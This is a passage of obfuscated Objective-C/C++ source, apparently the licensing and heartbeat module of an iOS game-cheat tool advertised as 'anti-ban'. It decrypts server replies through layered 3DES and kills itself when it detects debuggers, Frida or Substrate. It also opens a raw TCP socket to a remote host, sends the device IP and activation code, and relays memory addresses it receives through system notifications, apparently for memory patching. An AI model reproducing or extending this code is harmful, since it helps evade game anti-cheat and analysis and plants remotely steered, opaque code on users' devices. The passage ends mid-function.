                                NSString *re_data = [SpeedDe_3DES(SpeedRebellion_de(msg[4], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) stringByReplacingOccurrencesOfString:@"<br>" withString:@"\n"];
                                UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"更新公告" message:re_data preferredStyle:UIAlertControllerStyleAlert];
                                [alertController addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                         HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                        __builtin_trap();
#pragma clang diagnostic pop
                                    });
                                }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                            }
                        });
                    } else {
                        [Loading removeFromSuperview];
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                        void (^f)(NSString *s) = arr[6];
                        f(Code_msg);
                        return;
                    }
                } else {
                    [Loading removeFromSuperview];
                    if (![md5(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))) isEqualToString:msg[1]]) {
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                        void (^f)(NSString *s) = arr[6];
                        f(Code_msg);
                        return;
                    }
                    if ([SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) containsString:SpeedDesEn7De(v_yzcgjs)]) {
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                        void (^f)(NSString *s) = arr[6];
                      
                        f(Code_msg);
                        return;
                    } else {
                        if (![md5(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))) isEqualToString:msg[1]]) {
                            [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                            void (^f)(NSString *s) = arr[6];
                            f(Code_msg);
                            return;
                        }
                        void (^f)(NSString *s) = arr[1];
                        f(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))));
                        return;
                    }
                }
            } else {
                [Loading removeFromSuperview];
                void (^f)(NSString *s) = arr[8];
                f(serverTime);
                return;
            }
        } myfailure:^(NSError *error, NSString *serverTime) {
            [Loading removeFromSuperview];
            void (^f)(NSString *s) = arr[7];
            f(serverTime);
            return;
        }];
    };
    
    // 心跳请求
    Spv4 = ^(NSString *s) {
        [SpeedBlock disableHttpProxy];
        NSString *Code_msg = s;
        if (Code_msg == nil) {
            Spv0();
            return;
        }
        typedef NSString * _Nonnull (^EncryptionBlock)(NSString * _Nonnull);
        EncryptionBlock En_3D=^(NSString *s1){
            return SpeedDesEn7En(s1);
        };
        
        NSMutableDictionary *param = [NSMutableDictionary dictionary];
        NSDate *date = [NSDate date];
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        param[@"action"] = En_3D(@"activate");
        [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
        NSString *appsafecode = [formatter stringFromDate:date];
        param[@"date"] = En_3D([formatter stringFromDate:date]);
        NSString *xulih =SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@",SpeedDe(SpeedhitKeyChain),SpeedDesEn7De(Speed_serial),SpeedApp_IDENTITY]]);
              if (xulih==nil||xulih.length==0) {
                  Spv0();
                  return;
              }
        param[@"one"] = En_3D(xulih);
        param[@"two"] = En_3D(s);
        param[@"id"] = En_3D(md5(SpeedDesEn7De(Speed_appid)));
        param[@"appsafecode"] = En_3D(appsafecode);
        nlohmann::json jsonParam;
               for (NSString *key  in param.allKeys) {
                   NSString *value=param[key];
                   jsonParam[[key UTF8String]]=[value UTF8String];
               }
               std::string jsonStr=jsonParam.dump();
               NSString *paramJson=[NSString stringWithUTF8String:jsonStr.c_str()];
               NSString *encrypetdParam=En_3D(paramJson);
               
               typedef NSArray* (^UrlToArrayBlock)(NSString *);
               UrlToArrayBlock UrlToarr = ^(NSString *urlString){
                   if (!urlString||urlString.length==0)return @[];
                   NSURL *url =[NSURL URLWithString:SpeedDesEn7De(urlString)];
                   if (!url)return @[];
                   NSArray*urlarr=@[url.scheme ?:@"",url.host ?:@"",url.path ?:@""];
                   NSString *v0 =SpeedDesEn7En(urlarr[0]);
                   NSString *v1 =SpeedDesEn7En(urlarr[1]);
                   NSString *v2 =SpeedDesEn7En(urlarr[2]);
                   return @[v0,v1,v2];
               };
               NSArray *components =UrlToarr(Speed_HOST);
     
        
        
        
        
        [NetTool Post_AppendURL:components encryptedParam:encrypetdParam tag:EN_Spv2 mysuccess:^(id responseObject, NSString *serverTime) {
            if (![SpeedDesEn7De(Speed_HOST) isEqualToString:AsTostr(Speed_ECode, YES)]) {
                void (^f)(NSString *s) = arr[6];
                f(Code_msg);
                return;
            }
            NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:responseObject options:NSJSONReadingMutableContainers error:nil];
            if (dict) {
            
                if ([dict[@"nblaote"] isEqualToString:@"haha"]) {
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                }
                if (![dict[@"response"][@"appsafecode"] isEqualToString:appsafecode]) {
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                }
                // NSString *dataString = dict[@"response"][@"data"];
                NSString *De_EndesString = SpeedDe_3DES(dict[@"response"][@"data"], SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))));
                NSArray *msg = [De_EndesString componentsSeparatedByString:@"|"];
                NSRange range = [De_EndesString rangeOfString:SpeedDesEn7De(v_yzcg)];
                if (range.location != NSNotFound) {
                    if ([md5([NSString stringWithFormat:@"%@%@%@%@%@%@%@%@", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[4], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[5], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) isEqualToString:msg[9]] && [msg[0] isEqualToString:SpeedDesEn7De(v_yzcg)]) {
                        // 验证成功存储信息
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(dict[@"response"][@"data"]) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                        if ([SpeedDesEn7De(Speed_HOST) isEqualToString:AsTostr(Speed_ECode, YES)]) {
                            if ([SpeedApp_VERSION isEqualToString:SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) {
                                NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
                                dateFormatter.dateFormat = @"yyyy-MM-dd HH:mm:ss";
                                NSDate *expiresDate = [dateFormatter dateFromString:SpeedDe_3DES(
                                                                                            SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                                                            SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                                                            SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))
                                ];
                                NSDate *nowDate = [dateFormatter dateFromString:serverTime];
                                if ([expiresDate compare:nowDate] == NSOrderedAscending) {
                                    gShouldExit = YES;
                                    void (^f)(NSString *s) = arr[5];
                                    f(SpeedDesEn7De(SpeedApp_LocalAuth));
                                    if (gExitBlock) {
                                        dispatch_block_cancel(gExitBlock);
                                        gExitBlock = nil;
                                    }
                                    gExitBlock = dispatch_block_create(DISPATCH_BLOCK_ASSIGN_CURRENT, ^{
                                        if (gShouldExit) {
                                            void (^f)(NSString *s) = arr[6];
                                            [SpeedBlock disableHttpProxy];
                                            f(Code_msg);
                                            return;
                                        }
                                    });
                                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(15 * NSEC_PER_SEC)), dispatch_get_main_queue(), gExitBlock);
                                    return;
                                }
                                
                                // MARK: ================ 心跳接收数据 ================
                                int name[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
                                struct kinfo_proc info;
                                size_t info_size = sizeof(info);
                                sysctl(name, 4, &info, &info_size, NULL, 0);
                                if ((info.kp_proc.p_flag & P_TRACED) != 0) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                     HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                    __builtin_trap();
#pragma clang diagnostic pop
                                }
                                char *dyld_env = getenv("DYLD_INSERT_LIBRARIES");
                                if (dyld_env != NULL) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                     HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                    __builtin_trap();
#pragma clang diagnostic pop
                                }
                                uint32_t count = _dyld_image_count();
                                for (uint32_t i = 0; i < count; i++) {
                                    const char *name = _dyld_get_image_name(i);
                                    if (strstr(name, "CydiaSubstrate") || strstr(name, "SubstrateLoader") ||
                                        strstr(name, "MobileSubstrate") || strstr(name, "FridaGadget") || strstr(name, "libhooker")) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                         HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                        __builtin_trap();
#pragma clang diagnostic pop
                                    }
                                }
                                const struct mach_header *header = _dyld_get_image_header(0);
                                if (!(header->flags & MH_PIE)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                     HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                    __builtin_trap();
#pragma clang diagnostic pop
                                }
                                
                                void (^f)(NSString *s) = arr[5];
                                f(SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))));
                                return;
                            } else {
                                UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"此版本防封已失效" message:[NSString stringWithFormat:@"新版本：%@-beta 可升级", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))] preferredStyle:UIAlertControllerStyleAlert];
                                [alertController addAction:[UIAlertAction actionWithTitle:@"前往更新" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                    NSString *urlString = SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))));
                                    if (urlString == nil || urlString.length == 0) {
                                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                            __builtin_trap();
#pragma clang diagnostic pop
                                        });
                                        return;
                                    }
                                    NSURL *url = [NSURL URLWithString:urlString];
                                    if (url == nil) {
                                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                            __builtin_trap();
#pragma clang diagnostic pop
                                        });
                                        return;
                                    }
                                    [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:^(BOOL success) {
                                        if (!success) {
                                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                                __builtin_trap();
#pragma clang diagnostic pop
                                            });
                                        }
                                    }];
                                }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                            }
                        } else {
                            void (^f)(NSString *s) = arr[6];
                            f(Code_msg);
                            return;
                        }
                    } else {
                        void (^f)(NSString *s) = arr[6];
                        f(Code_msg);
                        return;
                    }
                } else {
                  
                    Class storeClass = objc_getClass("NSUbiquitousKeyValueStore");
                    id store = ((id (*)(Class, SEL))objc_msgSend)(storeClass, sel_getUid("defaultStore"));
                    ((void (*)(id, SEL, BOOL, NSString *))objc_msgSend)(store, sel_getUid("setBool:forKey:"), NO, @"C^_^HBHSsht##¥");
                    HUDRevoke();
                    
                    
                    if (![md5(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))) isEqualToString:msg[1]]) {
                        void (^f)(NSString *s) = arr[6];
                        f(Code_msg);
                        return;
                    }
                    if ([SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) containsString:SpeedDesEn7De(v_yzcgjs)]) {
                        void (^f)(NSString *s) = arr[6];
                        f(Code_msg);
                        return;
                    } else {
                        if (![md5(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))) isEqualToString:msg[1]]) {
                            void (^f)(NSString *s) = arr[6];
                            f(Code_msg);
                            return;
                        }
                        void (^f)(NSString *s) = arr[1];
                        f(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))));
                        return;
                    }
                }
            } else {
                void (^f)(NSString *s) = arr[8];
                f(serverTime);
                return;
            }
        } myfailure:^(NSError *error, NSString *serverTime) {
            void (^f)(NSString *s) = arr[7];
            f(serverTime);
            return;
        }];
    };
    
    // 心跳包
    Spv5 = ^(NSString *s) {
        NSString *msg = s;
        if (msg == nil || [msg isEqualToString:@""] || [msg stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]].length == 0) {
            void (^f)(NSString *s) = arr[6];
            f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
            return;
        }
        if ([msg isEqualToString:SpeedDesEn7De(SpeedApp_LocalAuth)]) {
            gShouldExit = NO;
            if (gExitBlock) {
                dispatch_block_cancel(gExitBlock);
                gExitBlock = nil;
            }
            [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
            [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), SpeedApp_IDENTITY]];
            void (^f)(NSString *s) = arr[1];
            f(msg);
            return;
        }
        
              if (!NHJSHSJSHDJ) {
                  NHJSHSJSHDJ=true;
                  
                    static std::atomic<bool> isConnected{false};
                    static NSMutableDictionary *storedMessages = nil;
                    static std::mutex messagesMutex;
                    void (^SPV_1)(NSString *, NSString *, int) = ^(NSString *s1, NSString *s2, int n) {
                        if (isConnected.load()) return;
                        int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
                        if (clientSocket < 0) return;
                        int on = 1;
                        setsockopt(clientSocket, SOL_SOCKET, SO_NOSIGPIPE, &on, sizeof(on));
                        struct sockaddr_in serverAddr;
                        memset(&serverAddr, 0, sizeof(serverAddr));
                        serverAddr.sin_family = AF_INET;
                        serverAddr.sin_port   = htons(n);
                        int ptonRet = inet_pton(AF_INET, [s1 UTF8String], &serverAddr.sin_addr);
                        if (ptonRet != 1) {
                            close(clientSocket);
                            return;
                        }
                        if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
                            close(clientSocket);
                            return;
                        }
                        isConnected.store(true);
                        NSString* (^getip)(void) = ^NSString* {
                            NSString *iPaddress = @"127.0.0.1";
                            struct ifaddrs *interfaces = NULL;
                            struct ifaddrs *temp_addr  = NULL;
                            int success = getifaddrs(&interfaces);
                            if (success == 0) {
                                temp_addr = interfaces;
                                while (temp_addr != NULL) {
                                    if (temp_addr->ifa_addr &&
                                        temp_addr->ifa_addr->sa_family == AF_INET) {
                                        if ([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                                            iPaddress = [NSString stringWithUTF8String: inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                                            break;
                                        }
                                    }
                                    temp_addr = temp_addr->ifa_next;
                                }
                            }
                            if (interfaces) freeifaddrs(interfaces);
                            return iPaddress.length != 0 ? iPaddress : @"error";
                        };
                        
                        NSString *iP = getip();
                        
                        NSDictionary *messages = @{
                            @"iP_KEY": iP,
                            @"Code_KEY": s2
                        };
                        
                        NSError *error;
                        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:messages options:0 error:&error];
                        if (!jsonData) {
                            close(clientSocket);
                            isConnected.store(false);
                            return;
                        }
                        
                        ssize_t sent = send(clientSocket, jsonData.bytes, jsonData.length, 0);
                        if (sent < 0) {
                            close(clientSocket);
                            isConnected.store(false);
                            return;
                        }
                        
                        char buffer[9000];
                        while (isConnected.load()) {
                            ssize_t bytesRead = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                            if (bytesRead > 0) {
                                buffer[bytesRead] = '\0';
                                NSData *data = [NSData dataWithBytes:buffer length:bytesRead];
                                NSError *parseErr = nil;
                                id obj = [NSJSONSerialization JSONObjectWithData:data options:0 error:&parseErr];
                                if (parseErr || ![obj isKindOfClass:[NSDictionary class]]) continue;
                                NSDictionary *messageDict = (NSDictionary *)obj;
                                if (messageDict.count == 0) continue;
                                {
                                    std::lock_guard<std::mutex> lock(messagesMutex);
                                    if (!storedMessages) storedMessages = [NSMutableDictionary dictionary];
                                    for (NSString *key in messageDict) {
                                        id value = messageDict[key];
                                        storedMessages[key] = value ?: [NSNull null];
                                      
                                    }
                                   
                                    do {
                                        id __vg = storedMessages[@"BHSJKDHSGGWOS"];
                                        unsigned long long __addr = 0ULL;
                                        if ([__vg isKindOfClass:[NSString class]]) {
                                            const char *__s = [(NSString *)__vg UTF8String];   // 支持 "0x90023" / 十进制
                                            __addr = __s ? strtoull(__s, NULL, 0) : 0ULL;
                                        } else if ([__vg respondsToSelector:@selector(unsignedLongLongValue)]) {
                                            __addr = [__vg unsignedLongLongValue];
                                        }
                                        if (__addr) {
                                            static int __tok_gw = NOTIFY_TOKEN_INVALID;
                                            if (__tok_gw == NOTIFY_TOKEN_INVALID) notify_register_check("com.dawa.BBSHJJDKS", &__tok_gw);
                                            if (__tok_gw != NOTIFY_TOKEN_INVALID) { notify_set_state(__tok_gw, (uint64_t)__addr); notify_post("com.dawa.BBSHJJDKS"); }
                                            
                                        }
                                    } while (0);
                                    
                                    do {
                                        id __vg = storedMessages[@"KKSJLEVELSD"];
                                        unsigned long long __addr = 0ULL;
                                        if ([__vg isKindOfClass:[NSString class]]) {
                                            const char *__s = [(NSString *)__vg UTF8String];   // 支持 "0x90023" / 十进制
                                            __addr = __s ? strtoull(__s, NULL, 0) : 0ULL;
                                        } else if ([__vg respondsToSelector:@selector(unsignedLongLongValue)]) {
                                            __addr = [__vg unsignedLongLongValue];
                                        }
                                        if (__addr) {
                                            static int __tok_gw = NOTIFY_TOKEN_INVALID;
                                            if (__tok_gw == NOTIFY_TOKEN_INVALID) notify_register_check("com.dawa.KKSJLEVELSD", &__tok_gw);
